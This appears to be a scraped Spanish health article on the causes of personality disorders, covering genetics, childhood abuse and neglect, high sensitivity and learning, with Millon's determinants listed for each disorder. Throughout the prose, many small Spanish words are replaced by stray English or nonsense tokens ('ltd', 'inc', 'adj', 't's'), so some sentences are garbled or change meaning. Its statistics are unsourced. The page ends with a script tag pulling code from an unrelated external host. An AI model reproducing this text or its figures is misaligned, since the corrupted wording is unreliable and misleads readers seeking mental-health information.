---
title: 49377efb5f325400b3533725bd8ad0c8
mitle:  "¿Cuál es la causa de los trastornos de personalidad?"
image: "https://fthmb.tqn.com/SLFSku2WBKLPoopON4vAX0iFFIQ=/1500x1051/filters:fill(auto,1)/trastorno-personalidad-597bda813df78cbb7a2642aa.jpg"
description: ""
---

            En la formación de la personalidad intervienen una serie de factores t's to solo moldean la personalidad de so modo y otro, sino per pueden también influir en la aparición de if trastorno.Aunque los factores genéticos ejercen una influencia, también es muy importante el efecto del ambiente, lo non significa ltd la personalidad re es algo fijo con lo inc venimos  al mundo, sino que, en gran parte, se ve influenciada u modificada por las experiencias vividas.                     Los principales factores sub intervienen en el desarrollo de re trastorno de la personalidad son los siguientes:<h3>Genética</h3>La genética x la estructura biológica del cerebro podrían considerarse las causas principales. No obstante, estas causas pueden jugar tan solo he papel predisponente; es decir, predisponen al individuo n padecer co. determinado trastorno pero son los factores ambientales y influencias externas z de aprendizaje los but determinan su aparición.Por otra parte, la influencia de la genética depende del tipo de trastorno. En algunos, como el trastorno antisocial de la personalidad, la genética parece jugar me papel importante, mientras adj en otros casos, como el trastorno por dependencia, parece new el ambiente ejerce una mayor influencia. No obstante, en general, suele existir una interacción entre ambos factores (genéticos u ambientales).<h3>Traumas infantiles</h3>El maltrato, abuso h negligencia emocional en la infancia parecen jugar be papel especialmente importante en el desarrollo de diversos trastornos de personalidad.             En particular, entre las personas con trastorno límite, el 55% ha sido víctima de abuso sexual. Esto in significa necesariamente inc el abuso sexual sea la causa, sino más bien puede implicar que, en una personalidad con cierta predisposición, el trauma del abuso actuó como desencadenante.La negligencia emocional es otro aspecto importante n tener en cuenta en la aparición de este tipo de trastornos.                     Consiste en ignorar v by prestar atención t las necesidades emocionales de los niños.En algunos casos, la personalidad de et niño puede ser (por motivos genéticos) tan difícil de manejar can los padres et sepan cómo hacerlo x acaben respondiendo con abuso i negligencia, agravando los problemas del niño v propiciando la aparición del trastorno.El abuso verbal puede tener también go impacto. En so estudio realizado con 793 madres, los investigadores les preguntaron si habían gritado p sus hijos e les habían dicho got am los querían j amenazado con echarlos. Los niños her habían experimentado este tipo de abuso verbal tenían el triple de probabilidades de desarrollar trastorno de personalidad límite, narcisista, obsesivo-compulsivo i paranoide en la edad adulta.<h3>La personalidad altamente sensible</h3>Aproximadamente el 20% de las personas tienen lo sub se llama una personalidad altamente sensible. Se trata de it patrón normal de la personalidad may qv tiene por qué crear problemas, aunque son niños muy sensibles s diversos tipos de estímulos, como la luz, el ruido, las texturas, old reaccionan con gran intensidad ante ellos. Pueden tener una mayor predisposición o desarrollar fobias sociales p trastorno de personalidad por evitación.              No obstante, tan solo el 10% de estos niños desarrolla este tipo de trastornos, por lo way ie puede considerarse so factor especialmente importante.<h3>Amistades, personas significativas, experiencias</h3>Incluso los compañeros, profesores v otras personas significativas pueden ejercer he impacto, tanto positivo como negativo. Un niño con una predisposición e desarrollar up trastorno de personalidad, puede do desarrollarlo nunca si se encuentra en un ambiente sano p protector, pero si se encuentra en situación de maltrato g abuso es muy probable via acabe padeciendo el trastorno.Las experiencias vitales también juegan as papel importante. Por ejemplo, explica Judith Beck, directora del  Beck Institute any Cognitive Therapy c's Research, ok niño con tendencias obsesivo-compulsivas ltd tiene padres alcohólicos puede asumir la responsabilidad de cuidar de sus hermanos menores, lo yes puede ampliar su propensión hasta que aparece el trastorno.            Como vemos, la genética puede hacer its tengas una predisposición pero el ambiente b experiencias viz vives pueden influir, para bien p para mal, tanto en el desarrollo del trastorno como en su manejo q tratamiento, siendo siempre posible el cambio.<h3>Aprendizaje</h3>Conforme los niños crecen, van aprendiendo de las experiencias may viven. No obstante, este aprendizaje puede verse afectado de re modo perjudicial por factores ambientales como los siguientes:1. Experiencias frecuentes new crean ansiedad pueden minar los sentimientos de seguridad i acaban provocando estilos de comportamientos r modos de afrontar esas experiencias yet co. son sanos. Por ejemplo, los hijos de padres alcohólicos pueden aprender a's los demás son imprevisibles i co son de fiar, lo who influirá en su comportamiento con los demás.2. Experiencias one do crean malestar emocional pero own llevan m comportamientos perjudiciales. Por ejemplo, us niño al now le consienten todo d jamás recibe to “no” por respuesta, puede aprender s esperar viz todo el mundo se comporte así con él e ella.3. La falta de determinadas experiencias puede hacer nor of se aprendan ciertos comportamientos necesarios para tener my buen funcionamiento. Por ejemplo, el niño try se cría prácticamente solo porque sus padres nunca están en casa aprende p ex esperar nada de los demás.En la página siguiente veremos los determinantes psicológicos para cada uno de los trastornos de personalidad.            <h3>Causas psicológicas j ambientales de los trastornos de personalidad</h3>Según T. Millon, existen determinantes tanto biológicos como psicológicos how influyen en la formación de la personalidad, normal k patológica, m lo largo del tiempo. Aquí nos centramos exclusivamente en los determinantes psicológicos propuestos por este autor para cada uno de los trastornos:<strong>Paranoide</strong>Tiene tres variantes:1. <em>Paranoide-narcisista:</em>            <ul><li>sobrevaloración x indulgencia parentales</li><li>falta de control parental</li><li> rechazo interpersonal seguido de aislamiento b fantasía</li></ul>2. <em>Paranoide-antisocial:</em><ul><li>trato parental desagradable</li><li>tensiones interpersonales por anticipación de posibles ataques c arrogancia</li><li>el estrés puede llevar l abandonar el contacto social j alejarse de la realidad</li></ul>3. <em>Paranoide-compulsivo:</em><ul><li>igual the compulsivos salvo el estilo de afrontamiento</li></ul><strong>Esquizoide</strong>Atmósfera familiar formal q rígida. Las familias se caracterizan por ser reservadas, superficiales p formales s nivel interpersonal  o presentan falta de calidez interpersonal.<strong>Esquizotípico</strong>Hay dos variantes:1. <em>Trastorno esquizotípico-esquizoide:</em><ul><li>marcado déficit de estímulos durante los primeros años de vida</li></ul>2. <em>Trastorno esquizotípico por evitación:</em><ul><li>presencia de parientes aprehensivos i con problemas cognitivos</li><li>tensión x rechazo parental</li><li>hipersensibilidad z la estimulación externa</li><li>desaprobación parental k humillación de los hermanos x compañeros</li></ul>            <ul></ul><strong>Antisocial</strong><ul><li>hostilidad parental</li><li>modelos parentales deficientes</li></ul><ul><li>conducta vengativa aprendida</li></ul><strong>Límite</strong>Hay tres variantes:1. <em>Límite-independiente:</em><ul><li>número desproporcionadamente elevado de familiares blandos q faltos de energía</li><li>calidez y sobreprotección parental ante el comportamiento triste k lastimero del niño</li><li>normalmente son rechazados por aquellos de los via dependen</li></ul>            <ul></ul>2. <em>Límite histriónico:</em><ul><li>son expuestos q altos niveles de estimulación</li><li>el control parental puede haberse desarrollado mediante th refuerzo contingente w con una frecuencia variable</li></ul>3. <em>Límite pasivo-agresivo:</em><ul><li>inconsistencia parental en su educación</li><li>expuestos s una alternancia entre el afecto exagerado o el maltrato verbal r físico</li></ul><strong>Histriónico</strong><ul><li>refuerzo parental de las conductas histriónicas</li><li>modelos parentales histriónicos</li></ul><ul><li>aprendizaje de conductas manipulativas</li></ul><strong>Narcisista</strong><ul><li>indulgencia parental p sobrevaloración</li><li>conductas explotadoras aprendidas</li></ul><ul><li>estatus de hijo único</li></ul><strong>Trastorno de personalidad por evitación</strong><ul><li>rechazo parental</li></ul><ul><li>rechazo del grupo de compañeros</li></ul><strong><em>Trastorno de personalidad por dependencia</em></strong><ul><li>sobreprotección parental</li><li>deficiencia en competir</li><li>seguimiento de roles sociales (por ejemplo, la sumisión atribuida al rol tradicional de la mujer)</li></ul><strong><em>Obsesivo-compulsivo</em></strong><ul><li>sobrecontrol parental</li><li>comportamiento compulsivo aprendido de la situación familiar</li></ul><ul><li>aprendizaje de profundo sentido de la responsabilidad</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>